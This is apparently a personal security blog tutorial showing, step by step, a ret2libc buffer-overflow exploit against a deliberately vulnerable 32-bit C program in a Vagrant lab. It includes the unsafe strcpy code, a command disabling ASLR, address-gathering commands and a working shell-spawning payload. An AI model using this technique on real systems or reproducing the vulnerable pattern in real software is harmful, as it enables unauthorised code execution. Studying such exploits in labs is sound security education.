---
layout: post
title: "Buffer Overflows: Level 2 (ret2libc)"
description: Post describing the exploit process for a traditional buffer overflow with a non executable stack
date: 2018-11-01 01:00:00
comments: true
share: true
tags: 32bit linux exploit bufferoverflow
author: xirax
---
# Moving forward
Following on from Level 1 where there were no protections in place we now
advance to a place where compiler makers got annoyed with people smashing the
stack and they said "hey lets make the stack not executable!!". Makes sense
right if the stack is not executable then hackers cant put code there and then
execute it.

The concept of ret2libc is as the name suggests, if we cant execute shellcode on
the stack we just have to force the program to return to somewhere that is
executable and in most binaries that will be the program itself or trusty libc.

# Show me the money!
Right below is a vulnerable C program. (follow along by using the vagrant file I
supplied in my post about vagrant) Its the same program used in level 1

{% highlight C %}
#include <stdio.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
  char buf[64];
  strcpy(buf, argv[1]);
  puts(buf);
  return 0;
}
{% endhighlight %}
Lets compile and run
```
vagrant@precise32:/vagrant$ gcc -fno-stack-protector -o vuln2 vuln.c
vagrant@precise32:/vagrant$ ./vuln2 AAAA
AAAA
```
Good all working, notice we have turned off stack protection (stack canaries)
and the stack is now not executable. There is one other protection we want to
disable which is ASLR
```
vagrant@precise32:/vagrant$ sudo bash -c "echo 0 > /proc/sys/kernel/randomize_va_space"
```
In this post we are also going to do this without a debugger just for giggles.

```
vagrant@precise32:/vagrant$ readelf -l ./vuln2

Elf file type is EXEC (Executable file)
Entry point 0x8048360
There are 9 program headers, starting at offset 52

Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  PHDR           0x000034 0x08048034 0x08048034 0x00120 0x00120 R E 0x4
  INTERP         0x000154 0x08048154 0x08048154 0x00013 0x00013 R   0x1
      [Requesting program interpreter: /lib/ld-linux.so.2]
  LOAD           0x000000 0x08048000 0x08048000 0x0061c 0x0061c R E 0x1000
  LOAD           0x000f14 0x08049f14 0x08049f14 0x00104 0x0010c RW  0x1000
  DYNAMIC        0x000f28 0x08049f28 0x08049f28 0x000c8 0x000c8 RW  0x4
  NOTE           0x000168 0x08048168 0x08048168 0x00044 0x00044 R   0x4
  GNU_EH_FRAME   0x000524 0x08048524 0x08048524 0x00034 0x00034 R   0x4
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
  GNU_RELRO      0x000f14 0x08049f14 0x08049f14 0x000ec 0x000ec R   0x1
```
As you can see from the output above our stack is no longer executable (the RW
on the GNU_STACK section)

# Finding the offset
Ok so now we need to find the point in our buffer at which we begin to overwrite
the return address. This is easy with a debugger and the use of patterns (as
seen in level1) but how would we do this without a debugger? The answer is a
binary search type algothrim which goes like this.
* Find input that crashes the program
* Reduce the size of the input
* If the program no longer crashes then choose a buffer length in the middle of
  the two numbers
* Rinse and repeat until you have reached a bugger length where adding 1 byte
  crashes the program

See this process in action below
```
vagrant@precise32:/vagrant$ ./vuln2 $(python -c 'print "A"*100')
��
Segmentation fault
```
Crashes to lets drop to 60
```
vagrant@precise32:/vagrant$  ./vuln2 $(python -c 'print "A"*60')
��
```
This no longer crashes so we'll try 80
```
vagrant@precise32:/vagrant$ ./vuln2 $(python -c 'print "A"*80')
��
Segmentation fault
```
Ok so 80 crashes so its somewhere between 60 and 80 so lets try 70
```
vagrant@precise32:/vagrant$  ./vuln2 $(python -c 'print "A"*70')
��
```
70 doesnt crash it so 75?
```
vagrant@precise32:/vagrant$ ./vuln2 $(python -c 'print "A"*75')
��
```
Nope 77 maybe??
```
vagrant@precise32:/vagrant$ ./vuln2 $(python -c 'print "A"*77')
��
Segmentation fault
```
Ok crashes so now if 76 doesnt crash the program then this is the buffer length
```
vagrant@precise32:/vagrant$ ./vuln2 $(python -c 'print "A"*76') 
��
```
Ok the program doesnt crash (it doesnt exit either) so 76 is our offset (spoiler
its exactly the same as level one!! I know you're shoked right!)

# Plan of attack
So we cant run code on the stack and we are not using a debugger so here is what
we are going to do.

We are going to overflow the return address to return to system and execute
/bin/sh. In order to do this we need to create a fake stack. Lets remind
ourselves how this looks.
```
ebp
return address
args
```
We want our shell to exit cleanly so we will return to exit of the system call.
System also requires on argument, the address of a string containing the command
we want to run. Our Payload will now look as follows
```
76 * "A" + address of system + address of exit + address of /bin/sh
```
The address of exit is used as the return address after the system call and the
address of /bin/sh is used as the argument to system

# Gathering data

## Libc base address
This one is fairly easy just use the LD_TRACE_LOADED_OBJECTS env var when
running the binary 
```
vagrant@precise32:/vagrant$ LD_TRACE_LOADED_OBJECTS=1 ./vuln2 AAAAAA
	linux-gate.so.1 =>  (0xb7fdd000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e29000)
	/lib/ld-linux.so.2 (0xb7fde000)
```
The address `0xb7e29000` next to the libc line is the base address

## Address of system + exit
For this one we will use the readelf tool on the libc binary and grep for the
requiored symbols
```
vagrant@precise32:/vagrant$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
   239: 001202b0    73 FUNC    GLOBAL DEFAULT   12 svcerr_systemerr@@GLIBC_2.0
   615: 0003f0b0   141 FUNC    GLOBAL DEFAULT   12 __libc_system@@GLIBC_PRIVATE
  1422: 0003f0b0   141 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
vagrant@precise32:/vagrant$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit
   109: 00033000    58 FUNC    GLOBAL DEFAULT   12 __cxa_at_quick_exit@@GLIBC_2.10
   136: 00032bf0    45 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0
   549: 000baf68    24 FUNC    GLOBAL DEFAULT   12 _exit@@GLIBC_2.0
   604: 001234b0    68 FUNC    GLOBAL DEFAULT   12 svc_exit@@GLIBC_2.0
   640: 00032fd0    45 FUNC    GLOBAL DEFAULT   12 quick_exit@@GLIBC_2.10
   856: 00032e30    58 FUNC    GLOBAL DEFAULT   12 __cxa_atexit@@GLIBC_2.1.3
  1024: 0012d6d0    60 FUNC    GLOBAL DEFAULT   12 atexit@GLIBC_2.0
  1359: 001a8224     4 OBJECT  GLOBAL DEFAULT   31 argp_err_exit_status@@GLIBC_2.1
  1471: 000ff1f0    67 FUNC    GLOBAL DEFAULT   12 pthread_exit@@GLIBC_2.0
  2058: 001a815c     4 OBJECT  GLOBAL DEFAULT   31 obstack_exit_failure@@GLIBC_2.0
  2208: 00032c20    77 FUNC    WEAK   DEFAULT   12 on_exit@@GLIBC_2.0
  2349: 00104900     2 FUNC    GLOBAL DEFAULT   12 __cyg_profile_func_exit@@GLIBC_2.2
```
So offset for system is `0x3f0b0` and exit is `0x32bf0`. A little bit of quick
maths (adding to libc base) gives us `0xb7e680b0` for system and `0xb7e5bbf0` for
exit

## /bin/sh
To find this we will use the strings utility on the libc binary
```
vagrant@precise32:/vagrant$ strings -atx /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
 1636a0 /bin/sh
```
The -a flag searches all the binary the -t flag tells strings to print offsets
and the x arg to the t flags specifies hex format. Adding this to libc base
gives `0xb7f8c6a0`

# Putting it alltogether
So with this information we now have our payload looks like
```
vagrant@precise32:/vagrant$ ./vuln2 $(python -c 'print "A" * 76 + "\xb0\x80\xe6\xb7" + "\xf0\xbb\xe5\xb7" + "\xa0\xc6\xf8\xb7"')
��
$ id
uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),110(sambashare)
$ exit
vagrant@precise32:/vagrant$
```
As you can see above we dropped into a shell and when we exited it exited
cleanly so no coredumps etc are left around

# What Now!!
Go ahead and do this on your own and practice!!!!
